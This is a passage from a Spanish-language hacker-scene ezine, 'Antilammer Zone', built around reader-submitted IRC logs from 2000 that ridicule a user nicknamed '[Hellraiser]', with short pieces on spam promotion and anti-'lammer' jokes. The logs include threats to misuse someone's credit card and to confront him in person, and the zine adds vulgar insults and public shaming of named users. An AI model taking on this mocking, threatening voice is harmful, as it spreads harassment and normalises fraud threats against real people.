-<13>-

  Logs, "Lei, Rei y me Mee" >-

En esta seccion se mostraran logs que nos han enviado que merecen la pena ser vistos. Algunos 
seran graciosos, otros deprimentes, que cada uno sea el juez.

-------------------------------------------------------------------------------------------------

Este nos lo envio el Dark por mail:

Session Start: Tue Mar 07 20:55:55 2000
Session Ident: [Hellraiser] (~Kvirc@xxxxxxxxxxxxxx.sinectis.com.ar)
<[Hellraiser]> bolas
<[Hellraiser]> sabes
<[Hellraiser]> porque digo que uso OpenBSD?
<[Hellraiser]> porque estoy condenado por un tiempo a NT
<[Hellraiser]> y si se sabe que estoy en NT todos preparan sus nukes :]
<[Hellraiser]> o no?
<n0brain> no se.. yo no voy a eso..
<[Hellraiser]> claro
<n0brain> no me cabe la gente q chamuya para quedar bien..
<n0brain> entendes..
<[Hellraiser]> yo no chamuyo para quedar bien
<[Hellraiser]> es que si se sabe que tengo que tener NT por un mes mas
<[Hellraiser]> todos desempolvan sus nukes
<[Hellraiser]> encima tengo el SP 4
<n0brain> la gente de #linux no te va andar nukeando porq uses nt..
<[Hellraiser]> no, pero no es el unico canal en que estoy
<[Hellraiser]> bah
<[Hellraiser]> ahora si
<[Hellraiser]> pero en otros no
<[Hellraiser]> es mas, me da asco NT
<[Hellraiser]> entendes?
<n0brain> seh seh..
<[Hellraiser]> bueno, por eso
<n0brain> hehe..
<[Hellraiser]> ayuda a mantener el "secreto" oculto por un mes mas
<[Hellraiser]> a que mi modem vuelva a mi
<[Hellraiser]> a que mi modem vuelva a mi
<n0brain> seh..
<[Hellraiser]> :]
Session Close: Tue Mar 07 21:09:27 2000

Ayayayaya, Pablito, que bonito, andar diciendo una cosa por la otra, que tipico de vos.

-------------------------------------------------------------------------------------------------

Este es uno que nos llego de un anonimo:


<[Hellraiser]> netgod: si... pero yo agarro binarios rpm o deb y les hago
update :)
<[Hellraiser]> rpm = exelente
<[Hellraiser]> Slackware TGZ = poor
<[Hellraiser]> DEB = Exelentisimo
<[Hellraiser]> yo antes era el tipico gilun que me actualizaba y compilaba
todo en source tarballs

Apr 14 21:40:10 2000
[09:39am][NiCd(+i)] [#Linux(+nt)] [Act: 2]
[Lag ??] [O/0 N/7 I/0 V/0 F/0] [U:a:S:b:h]
[#Linux]

-------------------------------------------------------------------------------------------------

Ahora uno de los mejores, que llego anonimo tambien

Session Start: Thu Mar 30 02:26:48 2000
[02:26] Session Ident: [Hellraiser] (~Ezkracho@xxxxxxxxxx.ciudad.com.ar)
[02:26] <[Hellraiser]> Hola garcador...
[02:26] <BeNdEr_Sleeping> Juaujaaaujaujaujaujauj que bien aparesiste
[02:27] <BeNdEr_Sleeping> en la antilammer zine
[02:27] <[Hellraiser]> "Bajate el ultimo Lammerzine que te vas a cagar de risa"
[02:27] <[Hellraiser]> Sabes que veo y oigo todo lo que haces?
[02:27] <BeNdEr_Sleeping> jua
[02:27] <[Hellraiser]> ahora por lo que hiciste la vas a pagar caro...
[02:27] <BeNdEr_Sleeping> mira
[02:27] <BeNdEr_Sleeping> vos sos un garca
[02:27] <BeNdEr_Sleeping> yo?
[02:27] <BeNdEr_Sleeping> UHHHHHHHH
[02:27] <BeNdEr_Sleeping> Que me vas a hacer
[02:27] <BeNdEr_Sleeping> vos me vas a romper la maquina
[02:27] <BeNdEr_Sleeping> pero yo la cara
[02:27] <[Hellraiser]> nono
[02:27] <[Hellraiser]> aajaja
[02:27] <BeNdEr_Sleeping> jajajajaj yo no
[02:27] <[Hellraiser]> a mi?
[02:27] <[Hellraiser]> panchito
[02:27] <BeNdEr_Sleeping> todos
[02:27] <BeNdEr_Sleeping> creemos
[02:27] <[Hellraiser]> dale, quien quieras
[02:27] <BeNdEr_Sleeping> mira sos un lammer y ahi lo dice
[02:27] <[Hellraiser]> dale
[02:28] <BeNdEr_Sleeping> y son unos kpos me hisieron reir mucho
[02:28] <[Hellraiser]> lo mismo decian lo de http://members.xoom.com/ezkarcha
[02:28] <[Hellraiser]> y desaparecieron misteriosamente...
[02:28] <[Hellraiser]> yo que vos no me reiria tanto...
[02:28] <BeNdEr_Sleeping> Ja ezkracha jajajajaja bueh yo solo me cague de risa pero
[02:28] <BeNdEr_Sleeping> Mira si vos me tocas
[02:28] <BeNdEr_Sleeping> algo
[02:28] <BeNdEr_Sleeping> vas a volverte en el ultra lammer
[02:28] <[Hellraiser]> Vos tenes una cuenta paga en Ciudad...
[02:29] <BeNdEr_Sleeping> Uhhhhhhhhh
[02:29] <BeNdEr_Sleeping> me va a afanar
[02:29] <[Hellraiser]> por lo tanto tengo acceso a todo lo relacionado con vos...
[02:29] <BeNdEr_Sleeping> la cuenta!
[02:29] <[Hellraiser]> Tarjeta...
[02:29] <BeNdEr_Sleeping> Cuantoooooooooo
[02:29] <[Hellraiser]> y demas...
[02:29] <BeNdEr_Sleeping> Uhhhhhhhhh me va a afanar la tarjetaaaaaaaaaaaaa
[02:29] <[Hellraiser]> Es mas... queres una prueba?
[02:29] <BeNdEr_Sleeping> a ver
[02:29] <BeNdEr_Sleeping> si te haces el machito
[02:29] <BeNdEr_Sleeping> dale
[02:29] <BeNdEr_Sleeping> sacamela
[02:29] <[Hellraiser]> Bueno, pero despues no te quejes
[02:29] <[Hellraiser]> ta?
[02:29] <BeNdEr_Sleeping> no me quejo
[02:29] <BeNdEr_Sleeping> ta
[02:29] <BeNdEr_Sleeping> dale
[02:29] <[Hellraiser]> listo
[02:29] <[Hellraiser]> es mas
[02:29] <[Hellraiser]> en tres dias exactos
[02:29] <[Hellraiser]> te llega:
[02:29] <BeNdEr_Sleeping> Uhhhhhh
[02:30] <BeNdEr_Sleeping> queria ahora
[02:30] <[Hellraiser]> Conectiva Linux Ed. Server 4.0
[02:30] <[Hellraiser]> por Correo Argentino
[02:30] <BeNdEr_Sleeping> Chonectiva?
[02:30] <BeNdEr_Sleeping> a ver
[02:30] <[Hellraiser]> a las 7:40hs
[02:30] <BeNdEr_Sleeping> bueno
[02:30] <BeNdEr_Sleeping> ta
[02:30] <BeNdEr_Sleeping> lo voy a esperar
[02:30] <BeNdEr_Sleeping> no se para que
[02:30] <[Hellraiser]> y si llega
[02:30] <[Hellraiser]> le fuleo la tarjeta...
[02:30] <BeNdEr_Sleeping> Lo pagas vos
[02:30] <BeNdEr_Sleeping> ok hace lo que quieras
[02:30] <BeNdEr_Sleeping> vos lo pediste
[02:30] <[Hellraiser]> jajaajaj
[02:30] <[Hellraiser]> lo pagas vos con tu tarjeta
[02:30] <BeNdEr_Sleeping> decime que tarjeta
[02:31] <BeNdEr_Sleeping> decime que tarjeta
[02:31] <[Hellraiser]> con la que abonas en Ciudad Internet
[02:31] <BeNdEr_Sleeping> Con cual abone
[02:31] <[Hellraiser]> con la tuya
[02:31] <BeNdEr_Sleeping> pero cual es
[02:31] <BeNdEr_Sleeping> yo no tengo
[02:32] [Hellraiser] End of /WHOIS list
-
Session Close: Thu Mar 30 02:32:50 2000

Bueno Aclaro que este idiota de [Gilraiser] que bueno es un boludo que yo casi me convierto en 
un lammer como este pero bueno menos mal que nunca mas le hise bola este dice mucho no hace nada 
y aparte yo la coneccion de ciudad la compre en Cash y nadie sabe mis datos los de ciudad asi 
que bueh gilraiser sos un boludo y deja de boludiar. Bueno hoy es 5 de abril y todavia estoy 
esperando el Conectiva please no seas mas lammer y deja de versear y hacerte el fana n1 de linux 
si vos vivis usando el winchot y el vb y despues decis un chamuyo cualquiera si lo uso con wine 
o vmware pero por que no te vas a lavar el culo boludo Te lo digo de onda.

Ese parrafo lo escribio el, no es de ninguno de los de AZ.

-------------------------------------------------------------------------------------------------

Otro del mismo que el anterior:

*** [Hellraiser] (~Ezkracho@xxxxxxxxxx.datamarkets.com.ar) has joined #Anime
<BeNdEr> Uh Lammers
*** LOCOPRO_KxAxMxUxS (~locopro_kamus@host021206.ciudad.com.ar) has joined #Anime
-
[Hellraiser] is ~Ezkracho@xxxxxxxxxx.datamarkets.com.ar * Lord Of The Hell
[Hellraiser] on @#Linux #Anime 
[Hellraiser] using prima18 Microsoft Exchange Chat Service
[Hellraiser] End of /WHOIS list
-
*** FENOMENOIDE (~IRcap63@xxxxxxx.fibertel.com.ar) has joined #Anime
<LOCOPRO_KxAxMxUxS> BuENas LLeGo LOCOPRO_KxAxMxUxS A #Anime PoR FaVoR No Se PaReN
[{[{[LoCoKâMuS ScripT V1.5]}]}] By LOCOPRO_KxAxMxUxS
<BeNdEr> Che toy esperando
<BeNdEr> el cornectiva
<[Hellraiser]> BeNdEr: Mañana, 17:50 en la esquina de la casa de gabriel, esperame que vamos a
aclarar las cosas enano 
<LOCOPRO_KxAxMxUxS> uuuuuuuuuuuuuuuuuuuuuuuuuuhhhhhhhhhhh
<LOCOPRO_KxAxMxUxS> se te acabo la joda
<BeNdEr> No ves
<BeNdEr> sos lammer
<BeNdEr> fuiste
<BeNdEr> no no voy a ir
<BeNdEr> que venga a mi casa
<[Hellraiser]> BeNdEr: listo, decimelo en la cara
<BeNdEr> me da mucha paja
<BeNdEr> Che
<BeNdEr> y el conectiva
<BeNdEr> quiero saber solo eso
<[Hellraiser]> BeNdEr: claro... todavia te haces la paja 
<BeNdEr> lo estoy esperando
*** FENOMENOIDE (~IRcap63@xxxxxxx.fibertel.com.ar) has left #Anime
<[Hellraiser]> BeNdEr: dijiste que no lo ibas a pagar pajero
*** BeNdEr is now known as Conectiva
<Conectiva> Conectiva
<Conectiva> Conectiva
<Conectiva> Conectiva
<Conectiva> Conectiva
<Rei-ayanami> hell raize
<Rei-ayanami> me robaste el nick
<[Hellraiser]> bueno, me voy a dormir
<[Hellraiser]> sigan haciendose la paja
<Conectiva> Cagonazo maricota
<[Hellraiser]> chaus
*** [Hellraiser] (~Ezkracho@xxxxxxxxxx.datamarkets.com.ar) has left #Anime

Bueno Lammercito por que no te tomas un curso de algo sos de madera no exisitis siempre cambias 
de tema y ensima sos un terrible CAGON.

Eso ultimo tambien es de el. Hasta nos ahorra el laburo de comentarlos, gracias.

-------------------------------------------------------------------------------------------------

Bueno, eso fue lo destacado. Agradecimientos a todos los que colaboraron.


Ustedes

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<14>-

  Relatos de un Lanzamiento Agitado >-

 Hola a todos, soy Rubbish, seguramente no me conocen, porque no escribi nada para AZ 1, y 
tampoco era la idea que escribiera para la 2. Mi labor fue principalmente la de publicitar la
ezine para que llegara a la mayor cantidad de gente posible.
 El dia del lanzamiento, me dedique principalmente al mass irc. Se que esto no es bueno, y es muy
molesto, pero es la forma de que los que se interesaran en nuestra publicacion, la conocieran.
Recibi comentarios de muchos tipos, insultos tambien, pero mas que nada, palabras de aliento y
de sorpresa, muchos canales de servidores de irc donde fue publicitada pusieron el mensaje de
topic, lo cual realmente me puso muy contento.
 Como "highlights", puedo contar anectdotas, como los comentarios de [Hellraiser], quien primero
me agradecio por la ezine, diciendo que gracias por el articulo sobre el. Al rato, parece que
despues de leerlo, me hizo comentarios ofensivos al respecto. CAOS tambien se mostro muy enojado
pero de entrada, parece que miro con mas atencion.
 Tengo el agrado de ser el encargado de esta misma labor para la publicacion de la 2, espero que
se alegren de recibir un nuevo numero de AZ, y que me sepan perdonar por las molestias.

Rubbish

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<15>-

  unknowlammer.cjb.net, la gente responde >-

 Al parecer hay un lammer que hace reir mas que ninguno en el server de irc de ciudad internet,
unknow (si, sin la n final), es un nick (aunque lleva los [ ] ^ ' y todos esas bostas que gustan
algunos lammers colgarse en los nicks.
 Incluyo el html y un txt de un log que esta linkeado en la pagina, porque vale la pena leerlos.
 Por otro lado (y afortunadamente), hay gente que ha respondido al gran movimiento lammer que se
da en estos dias, contraatacando con diversos textos, paginas, y esta ezine (of course ;}).
 Motivamos este repudio a los lammers y proponemos a quienes aun no se han puesto a colaborar
con esta causa, que se sumen a nuestra odisea (porque por cada uno de nosotros hay por lo menos
200 lammers), y nos ayuden a exterminar las actitudes lammer de la gente toda (pedite algo che).

Gelsito

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<16>-

  La Gran Verdad >-

                          ,;;;;;;;,     _____________________________
                         ;;;;;;;;;;;,  /                             )
                        ;;;;;',- ,-;' / AZ se mueve a los "Hackers" /
                        ;;;C`--()-() (  ___________________________/
                        ';;     __)   )/
                       __|    ,___\   /
                  .--~'        /-,_
                 /                 \
                 | AZ \        \    \
                  \    \  .  .  |    \
                   \   `,       ||    )
                    \    \      | `.  `.
                    |`.   `\    |   \   \
                     | ~-   `\  |    ~,  `,
                     |   ~._  ', |  __ \   \
                     |      \   \ _'   ';;;;
                    /       /:;;;'  \       `-._   (((())))
                   |       |                    `')))))(((((
                   |       |          "Hacker"  /////// O O
                    |       |      |\          (/////    __)

* Gracias a quien me dejo este dibujo, imagino que lo habra hecho el, no obstante no quiere que
se lo nombre y respeto eso.

____NOEL173____
   Sign here

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<17>-

  Mundo Lammer >-

"Un Pueblo Ignorante sera Mejor Manejado"

 - Lo dijo Confucio
 - Lo demostro Menem
 - Y las pruebas son los lammers.

____NOEL173____
   Sign here

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-


             //      .
            //      / \
           //      /   \
          //      /     \
         //      /_______\_____
        //      /         \   /
   ====<<      /           \ /
        \\                  /
         \\               _/_ 
          \\              /
           \\            /
            \\          /_____________

                                                            A n t i l a m m e r   Z o n e
                                                          " La pesadilla de los 'hackers' "
                                                                  -< az@uol.es -<


-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

                   _ _°
                c¶~~ CS~"s
              c~°  c$ $,  `c                  PoR uN MuNDo MeJoR, SiN LaMMeRs PoR SuPueSTo
             $~   xS   X   Sv                          - thE Az dIgItAl crEw & lEEts tEAm
            $$xewÌSDcxÃSDaNSX$zexScwIS
            $  xS~     ~Dx  #     xS~           << la gran kimera, es tan dificil, que
            $°sS~        Wx x   sS~                parece una utopia lammertablemente. >>
             $¶x          X#~ $Sswecxe~
            `~`$Ss_    °_s~~`
                 `~~~~"~

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-
